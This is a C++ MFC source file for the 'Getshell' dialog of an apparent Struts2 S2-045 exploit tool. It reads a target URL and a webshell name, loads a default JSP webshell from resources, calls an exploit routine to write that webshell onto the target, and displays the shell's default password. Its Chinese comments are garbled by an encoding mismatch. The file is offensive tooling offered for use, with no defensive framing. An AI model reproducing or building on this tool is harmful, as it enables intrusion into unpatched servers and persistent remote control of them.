
// Struts2-045-ExpDlg.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "Struts2-045-Exp.h"
#include "GetshellDlg.h"
#include "afxdialogex.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif


// ����Ӧ�ó��򡰹��ڡ��˵���� CAboutDlg �Ի���


// GetshellDlg �Ի���



GetshellDlg::GetshellDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(GetshellDlg::IDD, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void GetshellDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Text(pDX, IDC_GETSHELLURL, editTextURL);
	DDX_Text(pDX, IDC_GETSHELLPATH, editTextShellName);
	DDX_Text(pDX, IDC_GETSHELLDATA, editTextShellData);
	DDX_Text(pDX, IDC_GETSHELLRESULT, editTextResult);
}

BEGIN_MESSAGE_MAP(GetshellDlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDC_GETSHELL, &GetshellDlg::OnBnClickedGetshell)
END_MESSAGE_MAP()


// GetshellDlg ��Ϣ�������

BOOL GetshellDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// ��������...���˵�����ӵ�ϵͳ�˵��С�

	// IDM_ABOUTBOX ������ϵͳ���Χ�ڡ�
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// ���ô˶Ի����ͼ�ꡣ��Ӧ�ó��������ڲ��ǶԻ���ʱ����ܽ��Զ�
	//  ִ�д˲���
	SetIcon(m_hIcon, TRUE);			// ���ô�ͼ��
	SetIcon(m_hIcon, FALSE);		// ����Сͼ��

	// TODO: �ڴ���Ӷ���ĳ�ʼ������

	shellDefaultName.LoadStringA(IDS_GETSHELL_DEFAULT_NAME); //����Դ�ַ���������Ĭ��SHELL��
	shellDefaultData = getJspRes(IDR_JSP1); //����Դ����Ĭ��SHELL����
	shellDefaultPwd.LoadStringA(IDS_GETSHELL_DEFAULT_PWD); //����Դ�ַ���������Ĭ��SHELL����
	editTextShellName = shellDefaultName;
	editTextShellData = shellDefaultData;
	UpdateData(false);

	return TRUE;  // ���ǽ��������õ��ؼ������򷵻� TRUE
}

void GetshellDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// �����Ի��������С����ť������Ҫ����Ĵ���
//  �����Ƹ�ͼ�ꡣ����ʹ���ĵ�/��ͼģ�͵� MFC Ӧ�ó���
//  �⽫�ɿ���Զ���ɡ�

void GetshellDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // ���ڻ��Ƶ��豸������

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// ʹͼ���ڹ����������о���
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// ����ͼ��
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//���û��϶���С������ʱϵͳ���ô˺���ȡ�ù��
//��ʾ��
HCURSOR GetshellDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}

void GetshellDlg::OnBnClickedGetshell() //Getshell��ť����¼�
{
	UpdateData(true);
	CString url = editTextURL;
	url.Replace("\r",""); //ɾ���س��������޷���ȷ����
	url.Replace("\n",""); //ɾ�����У������޷���ȷ����
	CString shellName = editTextShellName;
	shellName.Replace("\\","/"); //�ָ���ͳһ���� /������Struts2�޷���ȷд�ļ�
	shellName.Replace("\r",""); //ɾ���س�������Struts2�޷���ȷд�ļ�
	shellName.Replace("\n",""); //ɾ�����У�����Struts2�޷���ȷд�ļ�
	if(url.IsEmpty()) //URLΪ��
	{
		MessageBox("������URL","����");
		return;
	}
	if(shellName.IsEmpty()) //SHELL����Ϊ��
	{
		MessageBox("������Webshell������","����");
		return;
	}
	char lastChar = shellName.GetAt(shellName.GetLength()-1); //��ȡд��·�����һ���ַ�
	if(lastChar == '/' || lastChar == '\\' || lastChar == '.') //·������ȷ
	{
		MessageBox("��������ȷ��Webshell������","����");
		return;
	}
	editTextResult = exp.getShell(url,shellName,editTextShellData);
	editTextResult += "\tĬ��Webshell����: " + shellDefaultPwd;
	editTextResult.Replace("\n","\r\n"); //���з� �滻������CEDIT�ؼ����ܻ�����ʾ
	UpdateData(false);
}

CString GetshellDlg::getJspRes(UINT resId) //��ȡJSP��Դ
{
	CString resData;
	HMODULE hModule = GetModuleHandle(NULL);
	HRSRC hRes = FindResource(hModule,MAKEINTRESOURCE(resId),"Jsp");  
	if(hRes == NULL)
		FreeResource(hRes);
	else
	{
		HGLOBAL hglobal = LoadResource(hModule,hRes);
		if(hglobal == NULL)
			FreeResource(hglobal);
		else
			resData.Format("%s",(LPVOID)hglobal);
	}
	return resData;
}
